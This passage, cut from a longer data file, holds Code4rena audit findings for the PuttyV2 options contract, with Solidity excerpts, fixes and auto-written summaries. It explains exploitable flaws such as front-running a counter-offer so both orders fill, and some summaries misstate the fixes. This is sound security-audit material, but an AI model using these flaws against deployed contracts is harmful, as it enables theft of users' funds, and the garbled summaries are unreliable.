commented](https://github.com/code-423n4/2022-06-putty-findings/issues/226#issuecomment-1174516212):**\n > Why would the caller send ETH when they don't have to?\n\n**[sseefried (warden) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/226#issuecomment-1174603678):**\n > User error is one possibility. \n\n**[outdoteth (Putty Finance) confirmed and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/226#issuecomment-1179001561):**\n > Report: Native ETH can be lost if itâ€™s not utilised in exercise and fillOrder.\n\n**[outdoteth (Putty Finance) resolved](https://github.com/code-423n4/2022-06-putty-findings/issues/226#issuecomment-1185413512):**\n > PR with fix: https://github.com/outdoteth/putty-v2/pull/5.\n\n**hyh (warden) reviewed mitigation:**\n > Fixed with native funds amount control added to strike transfer logic of `fillOrder`. Zero strike and zero premium corner cases are yet unhandled as described in [M.M-01](#mm-01-weth-zero-strike-call-fillorders-msgvalue-will-be-lost) and [M.M-02](#mm-02-zero-premium-short-fillorders-msgvalue-will-be-lost) in the Mitigation Review below.\n\n***\n\n",
      "summary": "\nThis bug report was submitted by multiple users and found in the PuttyV2.sol contract code. The issue is that the `fillOrder()` and `exercise()` functions can receive Ether even though there are code paths where it is not needed. This means that the Ether sent to these functions will be locked in the contract forever and the sender will not receive anything in return. A proof of concept was provided to show how this can happen. The recommended mitigation steps include adding a `require(0 == msg.value)` for certain conditions in the code. The developers of Putty Finance have confirmed and resolved the issue with a pull request. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/226",
      "tags": [],
      "finders": []
    },
    {
      "id": "42731",
      "title": "[M-02] Unbounded loops may cause `exercise()`s and `withdraw()`s to fail",
      "impact": "MEDIUM",
      "content": "_Submitted by IllIllI, also found by 0xNineDec, sashik_eth, shung, and xiaoming90_\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L636-L640>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L646-L650>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L657-L661>\n\n### Impact\n\nThere are no bounds on the number of tokens transferred in an order, and gas requirements can change (especially since orders can have a duration of [27 years](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L287)), so orders filled at time T1 may not be exercisable/withdrawable at time T2, or with the provided assets if the assets use a lot of gas during their transfers (e.g. aTokens and cTokens). The buyer of the option will have paid the premium, and will be unable to get the assets they are owed.\n\n### Proof of Concept\n\nThere are no upper bounds on the number of assets being transferred in these loops:\n\n```solidity\nFile: contracts/src/PuttyV2.sol   #1\n\n636       function _transferERC20sOut(ERC20Asset[] memory assets) internal {\n637           for (uint256 i = 0; i < assets.length; i++) {\n638               ERC20(assets[i].token).safeTransfer(msg.sender, assets[i].tokenAmount);\n639           }\n640       }\n```\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L636-L640>\n\n```solidity\nFile: contracts/src/PuttyV2.sol   #2\n\n646       function _transferERC721sOut(ERC721Asset[] memory assets) internal {\n647           for (uint256 i = 0; i < assets.length; i++) {\n648               ERC721(assets[i].token).safeTransferFrom(address(this), msg.sender, assets[i].tokenId);\n649           }\n650       }\n```\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L646-L650>\n\n```solidity\nFile: contracts/src/PuttyV2.sol   #3\n\n657       function _transferFloorsOut(address[] memory floorTokens, uint256[] memory floorTokenIds) internal {\n658           for (uint256 i = 0; i < floorTokens.length; i++) {\n659               ERC721(floorTokens[i]).safeTransferFrom(address(this), msg.sender, floorTokenIds[i]);\n660           }\n661       }\n```\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L657-L661>\n\n### Recommended Mitigation Steps\n\nHave an upper bound on the number of assets, or allow them to be transferred out one at a time, if necessary\n\n**[outdoteth (Putty Finance) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/227#issuecomment-1177670801):**\n > Adding a hardcoded check at the contract level is not a viable fix given that gas costs and limits are subject change over time.\n> Instead, there already exists a limit of 30 assets on the frontend/db level.\n\n**[outdoteth (Putty Finance) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/227#issuecomment-1179001005):**\n > Report: Unbounded loop can prevent put option from being exercised.\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/227#issuecomment-1179845396):**\n > Medium severity is justified because, while very unlikely to happen, there could be a loss of assets.\n\n**hyh (warden) reviewed mitigation:**\n > Now addressed on UI/DB level.\n\n***\n\n",
      "summary": "\nThis bug report was submitted by several people and found in the PuttyV2.sol contract. The bug allows for an unlimited number of tokens to be transferred in an order, which can cause issues with gas requirements and potentially make orders unexercisable or unwithdrawable. The proof of concept shows that there are no upper limits on the number of assets that can be transferred in certain loops in the code. The recommended mitigation steps include implementing an upper bound on the number of assets or allowing them to be transferred out one at a time. The team behind Putty Finance has acknowledged the issue but disagrees with the severity and has implemented a limit of 30 assets on the frontend and database level. The judge has deemed the bug to have a medium severity as there is a potential for loss of assets, although it is unlikely to occur. The warden has reviewed the mitigation steps and believes it has been addressed on the UI and database level. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/227",
      "tags": [],
      "finders": []
    },
    {
      "id": "42730",
      "title": "[H-02] `acceptCounterOffer()` May Result In Both Orders Being Filled",
      "impact": "HIGH",
      "content": "_Submitted by kirk-baird, also found by csanuragjain, hansfriese, Lambda, and minhquanym_\n\nWhen a user is attempting to accept a counter offer they call the function [acceptCounterOffer()](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L573-L584) with both the `originalOrder` to be cancelled and the new `order` to fill. It is possible for an attacker (or any other user who happens to call `fillOrder()` at the same time) to fill the `originalOrder` before `acceptCounterOffer()` cancels it.\n\nThe impact is that both `originalOrder` and `order` are filled. The `msg.sender` of `acceptCounterOffer()` is twice as leveraged as they intended to be if the required token transfers succeed.\n\n### Proof of Concept\n\n[acceptCounterOffer()](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L573-L584) calls `cancel()` on the original order, however it will not revert if the order has already been filled.\n\n```solidity\n    function acceptCounterOffer(\n        Order memory order,\n        bytes calldata signature,\n        Order memory originalOrder\n    ) public payable returns (uint256 positionId) {\n        // cancel the original order\n        cancel(originalOrder);\n\n\n        // accept the counter offer\n        uint256[] memory floorAssetTokenIds = new uint256[](0);\n        positionId = fillOrder(order, signature, floorAssetTokenIds);\n    }\n```\n\n[cancel()](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L526-L535) does not revert if an order has already been filled it only prevents future `fillOrder()` transactions from succeeding.\n\n```solidity\n    function cancel(Order memory order) public {\n        require(msg.sender == order.maker, \"Not your order\");\n\n\n        bytes32 orderHash = hashOrder(order);\n\n\n        // mark the order as cancelled\n        cancelledOrders[orderHash] = true;\n\n\n        emit CancelledOrder(orderHash, order);\n    }\n```\n\nTherefore any user may front-run the `acceptCounterOffer()` transaction with a `fillOrder()` transaction that fills the original order. As a result the user ends up filling both `order` and `originalOrder`. Then `acceptCounterOffer()` cancels the `originalOrder` which is essentially a no-op since it's been filled and continues to fill the new `order` resulting in both orders being filled.\n\n### Recommended Mitigation Steps\n\nConsider having `cancel()` revert if an order has already been filled. This can be done by adding the following line `require(_ownerOf[uint256(orderHash)] == 0)`.\n\n**[outdoteth (Putty Finance) confirmed and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/44#issuecomment-1179004913):**\n > Report: Itâ€™s possible to fill an order twice by accepting a counter offer for an already filled order.\n\n**[outdoteth (Putty Finance) resolved](https://github.com/code-423n4/2022-06-putty-findings/issues/44#issuecomment-1185411950):**\n > PR with fix: https://github.com/outdoteth/putty-v2/pull/2.\n\n**hyh (warden) reviewed mitigation:**\n > Fixed by requiring that order can't be in the filled state on cancel. This fully adheres to the original logic, but wasn't controlled for before.\n\n\n***\n\n",
      "summary": "\nThe bug report is about a vulnerability in the code for Putty Finance, a platform for trading digital assets. The bug allows an attacker to fill an order twice by accepting a counter offer for an already filled order. This results in both orders being filled and the person making the transaction being twice as leveraged as intended. The impact of this bug is that it can cause financial loss for users. The report suggests a mitigation step to fix the bug, which involves adding a line of code to prevent the order from being filled if it has already been filled. The bug has been confirmed and resolved by the team at Putty Finance. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/44",
      "tags": [],
      "finders": []
    },
    {
      "id": "5015",
      "title": "[L-07] No Check if onERC721Received Is Implemented",
      "impact": "LOW",
      "content": "\nThe `PuttyV2.fillOrder` will mint a long position NFT and short position NFT to the order maker and taker. When minting a NFT, the function does not check if a receiving contract implements onERC721Received().\n\nThe intention behind this function is to check if the address receiving the NFT, if it is a contract, implements onERC721Received(). Thus, there is no check whether the receiving address supports ERC-721 tokens and position could be not transferrable in some cases.\n\nFollowing shows that `_mint` is used instead of `_safeMint`.\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L303>\n\n```solidity\nfunction fillOrder(\n\tOrder memory order,\n\tbytes calldata signature,\n\tuint256[] memory floorAssetTokenIds\n) public payable returns (uint256 positionId) {\n\t..SNIP..\n\t// create long/short position for maker\n\t_mint(order.maker, uint256(orderHash));\n\n\t// create opposite long/short position for taker\n\tbytes32 oppositeOrderHash = hashOppositeOrder(order);\n\tpositionId = uint256(oppositeOrderHash);\n\t_mint(msg.sender, positionId);\n\t..SNIP..\n```\n\n### Recommendation\n\nConsider using [`_safeMint`](https://github.com/Rari-Capital/solmate/blob/3c738133a0c1697096d63d28ef7a8ef298f9af6b/src/tokens/ERC721.sol#L193) instead of [`_mint`](https://github.com/Rari-Capital/solmate/blob/3c738133a0c1697096d63d28ef7a8ef298f9af6b/src/tokens/ERC721.sol#L157).\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "#l-07-no-check-if-onerc721received-is-implemented",
      "tags": [],
      "finders": []
    },
    {
      "id": "5014",
      "title": "[L-06] Order Can Be Cancelled Even After Being Filled",
      "impact": "LOW",
      "content": "\nOnce an order has been filled, no one should be able to cancel the order or mark the order as `Cancelled`.\n\nThe following code shows that the order maker can change the status of the order to `Cancelled` at any point of time.\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L526>\n\n```solidity\n/**\n    @notice Cancels an order which prevents it from being filled in the future.\n    @param order The order to cancel.\n */\nfunction cancel(Order memory order) public {\n    require(msg.sender == order.maker, \"Not your order\");\n\n    bytes32 orderHash = hashOrder(order);\n\n    // mark the order as cancelled\n    cancelledOrders[orderHash] = true;\n\n    emit CancelledOrder(orderHash, order);\n}\n```\n\nAlthough changing the status of an order to `Cancelled` after it has been filled does not cause any lost of funds at the later stages (e.g. when exercising or withdrawing), it might cause unnecessary confusion to the users as it does not accurately reflect the status of an order on-chain.\n\nUsers might fetch the status of an order directly from the `cancelledOrders` mapping or poll the on-chain for emitted event, and come to a wrong conclusion that since the order has been cancelled, it has not been filled.\n\n### Recommendation\n\nIt is recommended to update the `cancel` function to only allow order maker to call this function only if an order has not been filled.\n\n```solidity\nfunction cancel(Order memory order) public {\n    require(msg.sender == order.maker, \"Not your order\");\n\n    bytes32 orderHash = hashOrder(order);\n    \n    // If an order has been filled, the positionExpirations[orderHash] will be populated.\n    require(positionExpirations[orderHash] == 0, \"Order has already been filled. Cannot cancel.\")\n\n    // mark the order as cancelled\n    cancelledOrders[orderHash] = true;\n\n    emit CancelledOrder(orderHash, order);\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "#l-06-order-can-be-cancelled-even-after-being-filled",
      "tags": [],
      "finders": []
    },
    {
      "id": "5013",
      "title": "[L-05] Order Cannot Be Filled Due To Unbounded floorTokens, ERC20Asset Or ERC721Asset Within An Order",
      "impact": "LOW",
      "content": "\nAn order can contain large number of tokens within the `floorTokens`, `ERC20Asset` or `ERC721Asset` arrays of an order.\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L78>\n\n```solidity\nstruct Order {\n    address maker;\n    bool isCall;\n    bool isLong;\n    address baseAsset;\n    uint256 strike;\n    uint256 premium;\n    uint256 duration;\n    uint256 expiration;\n    uint256 nonce;\n    address[] whitelist;\n    address[] floorTokens;\n    ERC20Asset[] erc20Assets;\n    ERC721Asset[] erc721Assets;\n}\n```\n\nWhen the `PuttyV2.fillOrder` function is called, it will attempts to loop through all the `floorTokens`, `ERC20Asset` or `ERC721Asset` arrays of an order to transfer the required assets to `PuttyV2` contract from the order maker or taker.\n\nThe [`_transferERC20sIn`](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L593), [`_transferERC721sIn`](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L610), [`_transferFloorsIn`](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L622) attempt to loop through all the tokens within the array. However, if array contains large number of tokens, it will result in out-of-gas error and cause a revert. Thus, this order can never be filled.\n\nFollowing is an example of the vulnerable function.\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L593>\n\n```solidity\nfunction _transferERC20sIn(ERC20Asset[] memory assets, address from) internal {\n    for (uint256 i = 0; i < assets.length; i++) {\n        address token = assets[i].token;\n        uint256 tokenAmount = assets[i].tokenAmount;\n\n        require(token.code.length > 0, \"ERC20: Token is not contract\");\n        require(tokenAmount > 0, \"ERC20: Amount too small\");\n\n        ERC20(token).safeTransferFrom(from, address(this), tokenAmount);\n    }\n}\n```\n\n### Recommendation\n\nIt is recommended to restrict the number of tokens  within the `floorTokens`, `ERC20Asset` or `ERC721Asset` arrays of an order. (e.g. Maximum of 10 tokens)\n\nAlthough client-side or off-chain might have already verified that the number of tokens do not exceed a certain limit within an order, simply relying on client-side and off-chain validations are not sufficient. It is possible for an attacker to bypass the client-side and off-chain validations and interact directly with the contract. Thus, such validation must also be implemented on the on-chain contracts.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "#l-05-order-cannot-be-filled-due-to-unbounded-floortokens-erc20asset-or-erc721asset-within-an-order",
      "tags": [],
      "finders": []
    },
    {
      "id": "5012",
      "title": "[L-04] Order Cannot Be Filled Due To Unbounded Whitelist Within An Order",
      "impact": "LOW",
      "content": "\nAn order can contain large number of addresses within the `whitelist` array of an order.\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L78>\n\n```solidity\nstruct Order {\n    address maker;\n    bool isCall;\n    bool isLong;\n    address baseAsset;\n    uint256 strike;\n    uint256 premium;\n    uint256 duration;\n    uint256 expiration;\n    uint256 nonce;\n    address[] whitelist;\n    address[] floorTokens;\n    ERC20Asset[] erc20Assets;\n    ERC721Asset[] erc721Assets;\n}\n```\n\nWhen the `PuttyV2.fillOrder` function is called, it will attempt to check if the caller is whitelisted by looping through the `order.whitelist` array. However, if `order.whitelist` array contains large number of addresses, it will result in out-of-gas error and cause a revert. Thus, this order can never be filled.\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L284>\n\n```solidity\nfunction fillOrder(\n    Order memory order,\n    bytes calldata signature,\n    uint256[] memory floorAssetTokenIds\n) public payable returns (uint256 positionId) { // @audit-issue no re-entrancy guard\n\t..SNIP..\n    // check msg.sender is allowed to fill the order\n    require(order.whitelist.length == 0 || isWhitelisted(order.whitelist, msg.sender), \"Not whitelisted\");\n\t..SNIP..\n}\n```\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L669>\n\n```solidity\nfunction isWhitelisted(address[] memory whitelist, address target) public pure returns (bool) {\n    for (uint256 i = 0; i < whitelist.length; i++) {\n        if (target == whitelist[i]) return true;\n    }\n\n    return false;\n}\n```\n\n### Recommendation\n\nIt is recommended to restrict the number of whitelisted addresses within an order to a upper limit (e.g. 30).\n\nAlthough client-side or off-chain might have already verified that the number of whitelisted addresses do not exceed a certain limit within an order, simply relying on client-side and off-chain validations are not sufficient. It is possible for an attacker to bypass the client-side and off-chain validations and interact directly with the contract. Thus, such validation must also be implemented on the on-chain contracts.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "#l-04-order-cannot-be-filled-due-to-unbounded-whitelist-within-an-order",
      "tags": [],
      "finders": []
    },
    {
      "id": "5011",
      "title": "[L-03] Insufficient Input Validation",
      "impact": "LOW",
      "content": "\nThe `PuttyV2.fillOrder` function does not validate that the `msg.sender` (order taker) is the same as the order maker, which might potentially lead to unwanted behaviour within the system. Order taker should not be the same as order maker under any circumstances.\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L268>\n\n```solidity\n    function fillOrder(\n        Order memory order,\n        bytes calldata signature,\n        uint256[] memory floorAssetTokenIds\n    ) public payable returns (uint256 positionId) {\n        /* ~~~ CHECKS ~~~ */\n\n        bytes32 orderHash = hashOrder(order);\n\n        // check signature is valid using EIP-712\n        require(SignatureChecker.isValidSignatureNow(order.maker, orderHash, signature), \"Invalid signature\");\n\n        // check order is not cancelled\n        require(!cancelledOrders[orderHash], \"Order has been cancelled\");\n\n        // check msg.sender is allowed to fill the order\n        require(order.whitelist.length == 0 || isWhitelisted(order.whitelist, msg.sender), \"Not whitelisted\");\n\n        // check duration is valid\n        require(order.duration < 10_000 days, \"Duration too long\");\n\n        // check order has not expired\n        require(block.timestamp < order.expiration, \"Order has expired\");\n\n        // check base asset exists\n        require(order.baseAsset.code.length > 0, \"baseAsset is not contract\");\n```\n\n### Recommendation\n\nImplement the necessary check to ensure that order taker is not the same as order maker.\n\n```solidity\nrequire(msg.sender != order.maker, \"Invalid order taker\");\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "#l-03-insufficient-input-validation",
      "tags": [],
      "finders": []
    },
    {
      "id": "5010",
      "title": "[L-02] Discontinuity in Exercise Period",
      "impact": "LOW",
      "content": "\nThe position can be exercised if current block timestamp is less than the position's expiration.\n\nThe position can be withdrawed if current block timestamp is greater than the position's expiration\n\nHowever, when current block timestamp is equal to the position's expiration (`block.timestamp == positionExpirations`), the state is unknown (cannot be exercised or withdraw)\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L401>\n\n```solidity\nfunction exercise(Order memory order, uint256[] calldata floorAssetTokenIds) public payable {\n    ..SNIP..\n    // check position has not expired\n    require(block.timestamp < positionExpirations[uint256(orderHash)], \"Position has expired\");\n    ..SNIP..\n}\n```\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L481>\n\n```solidity\nfunction withdraw(Order memory order) public {\n    ..SNIP..\n    // check long position has either been exercised or is expired\n    require(block.timestamp > positionExpirations[longPositionId] || isExercised, \"Must be exercised or expired\");\n    ..SNIP..\n}\n```\n\n### Recommendation\n\nAllow the user to withdraw the position upon expiration.\n\n```solidity\nfunction withdraw(Order memory order) public {\n    ..SNIP..\n    // check long position has either been exercised or is expired\n    require(block.timestamp >= positionExpirations[longPositionId] || isExercised, \"Must be exercised or expired\");\n    ..SNIP..\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "#l-02-discontinuity-in-exercise-period",
      "tags": [],
      "finders": []
    },
    {
      "id": "5009",
      "title": "[L-01] Lack Of Reentrancy Guards On External Functions",
      "impact": "LOW",
      "content": "\nThe following external functions within the `PuttyV2` contract contain function calls (e.g.  `safeTransferFrom`, `safeTransfer`) that pass control to external contracts. Additionally, if ERC777 tokens are being used within an order, it contains various hooks that will pass the execution control to the external party.\n\nThus, it might allow an malicious external contract to re-enter to the contract.\n\n*   `PuttyV2.fillorder`\n*   `PuttyV2.exercise`\n*   `PuttyV2.withdraw`\n*   `PuttyV2.batchFillOrder`\n*   `Putty.acceptCounterOffer`\n\nNo re-entrancy attacks that could lead to loss of assets were observed during the assessment. Thus, this issue is marked as Low.\n\nThe following shows examples of function call being made to an external contract\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L324>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L436>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L451>\n\n### Recommendation\n\nIt is recommended to follow the good security practices and apply necessary reentrancy prevention by utilizing the nonReentrant modifier from [Openzeppelin Library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol) to block possible re-entrancy.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "#l-01-lack-of-reentrancy-guards-on-external-functions",
      "tags": [],
      "finders": []
    },
    {
      "id": "2949",
      "title": "[M-16] Use of Solidity version 0.8.13 which has two known issues applicable to PuttyV2",
      "impact": "MEDIUM",
      "content": "_Submitted by hubble, also found by horsefacts_\n\nThe solidity version 0.8.13 has below two issues applicable to PuttyV2\n\n1.  Vulnerability related to ABI-encoding.\n\n    ref : <https://blog.soliditylang.org/2022/05/18/solidity-0.8.14-release-announcement/><br>\n    This vulnerability can be misused since the function hashOrder() and hashOppositeOrder() has applicable conditions.<br>\n    \"...pass a nested array directly to another external function call or use abi.encode on it.\"\n\n2.  Vulnerability related to 'Optimizer Bug Regarding Memory Side Effects of Inline Assembly'\n\n    ref : <https://blog.soliditylang.org/2022/06/15/solidity-0.8.15-release-announcement/><br>\n    PuttyV2 inherits solidity contracts from openzeppelin and solmate, and both these uses inline assembly, and optimization is enabled while compiling.\n\n### Recommended Mitigation Steps\n\nUse recent Solidity version 0.8.15 which has the fix for these issues.\n\n**[outdoteth (Putty Finance) confirmed and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/348#issuecomment-1176607284):**\n > Great catch.\n\n > Report: Use of Solidity 0.8.13 with known issues in ABI encoding and memory side effects.\n\n**[outdoteth (Putty Finance) resolved](https://github.com/code-423n4/2022-06-putty-findings/issues/348#issuecomment-1185414140):**\n > PR with fix: https://github.com/outdoteth/putty-v2/pull/6.\n\n**hyh (warden) reviewed mitigation:**\n > Fixed by bumping the solidity version.\n\n***\n\n",
      "summary": "\nThis bug report is about two vulnerabilities related to the Solidity version 0.8.13 used by the PuttyV2 contract. The first vulnerability is related to ABI-encoding and it can be misused if certain conditions are met. The second vulnerability is related to an optimizer bug regarding memory side effects of inline assembly. Both of these issues are addressed in the recent Solidity version 0.8.15. Therefore, the recommended mitigation step is to upgrade to the latest version of Solidity.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/348",
      "tags": [],
      "finders": [
        "horsefacts",
        "hubble"
      ]
    },
    {
      "id": "2948",
      "title": "[M-15] Zero strike call options will avoid paying system fee",
      "impact": "MEDIUM",
      "content": "_Submitted by hyh, also found by csanuragjain, minhquanym, and Treasure-Seeker_\n\nZero and near zero strike calls are common derivative type. For such derivatives the system will not be receiving fees are the fee is now formulated as a fraction of order strike.\n\nAlso, it can be a problem for OTM call options, when the option itself is nearly worthless, while the fee will be substantial as strike will be big. Say 1k ETH BAYC call doesn't have much value, but the associated fee will be 10x of usual fee, i.e. substantial, while there is nothing to justify that.\n\nMarking this as medium severity as that's a design specifics that can turn off or distort core system fee gathering.\n\n### Proof of Concept\n\nCurrently fee is linked to the order strike which makes it vary heavily for different types of orders, for example deep ITM and OTM calls:\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L494-L506>\n\n```solidity\n        // transfer strike to owner if put is expired or call is exercised\n        if ((order.isCall && isExercised) || (!order.isCall && !isExercised)) {\n            // send the fee to the admin/DAO if fee is greater than 0%\n            uint256 feeAmount = 0;\n            if (fee > 0) {\n                feeAmount = (order.strike * fee) / 1000;\n                ERC20(order.baseAsset).safeTransfer(owner(), feeAmount);\n            }\n\n            ERC20(order.baseAsset).safeTransfer(msg.sender, order.strike - feeAmount);\n\n            return;\n        }\n```\n\n### Recommended Mitigation Steps\n\nConsider linking the fee to option premium as this is option value that cannot be easily manipulated and exactly corresponds to the trading volume of the system.\n\ni.e. consider moving fee gathering to fillOrder:\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L322-L340>\n\n```solidity\n        // transfer premium to whoever is short from whomever is long\n        if (order.isLong) {\n            ERC20(order.baseAsset).safeTransferFrom(order.maker, msg.sender, order.premium);\n        } else {\n            // handle the case where the user uses native ETH instead of WETH to pay the premium\n            if (weth == order.baseAsset && msg.value > 0) {\n                // check enough ETH was sent to cover the premium\n                require(msg.value == order.premium, \"Incorrect ETH amount sent\");\n\n                // convert ETH to WETH and send premium to maker\n                // converting to WETH instead of forwarding native ETH to the maker has two benefits;\n                // 1) active market makers will mostly be using WETH not native ETH\n                // 2) attack surface for re-entrancy is reduced\n                IWETH(weth).deposit{value: msg.value}();\n                IWETH(weth).transfer(order.maker, msg.value);\n            } else {\n                ERC20(order.baseAsset).safeTransferFrom(msg.sender, order.maker, order.premium);\n            }\n        }\n```\n\n**[Alex the Entreprenerd (warden) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/373#issuecomment-1174511995):**\n > Zero strike will indeed have a fee of 0.\n\n**[outdoteth (Putty Finance) confirmed and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/373#issuecomment-1178994046):**\n > Report: Charging fees on the strike amount instead of the premium amount can lead to disproportionate fees.\n\n**[outdoteth (Putty Finance) resolved](https://github.com/code-423n4/2022-06-putty-findings/issues/373#issuecomment-1185414345):**\n > PR with fix: https://github.com/outdoteth/putty-v2/pull/4.\n\n**hyh (warden) reviewed mitigation:**\n > The same fix as in [H-01](https://github.com/code-423n4/2022-06-putty-findings/issues/269).\n\n***\n\n",
      "summary": "\nA bug has been discovered in the code for a derivative type called zero and near zero strike calls. The fee for these derivatives is formulated as a fraction of the order strike. This can be a problem for out-of-the-money (OTM) call options, where the option is nearly worthless but the fee is substantial due to the large strike. This design issue could turn off or distort the core system fee gathering, making it a medium severity vulnerability.\n\nProof of concept code shows that the fee is linked to the order strike, which varies heavily for different types of orders. For example, deep in-the-money (ITM) and OTM calls.\n\nThe recommended mitigation step is to link the fee to the option premium, which is the option value that cannot be easily manipulated and corresponds to the trading volume of the system. This can be done by moving the fee gathering to the fillOrder section of the code. This will convert ETH to WETH instead of forwarding native ETH to the maker, which has two benefits: 1) active market makers will mostly be using WETH not native ETH and 2) attack surface for re-entrancy is reduced.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
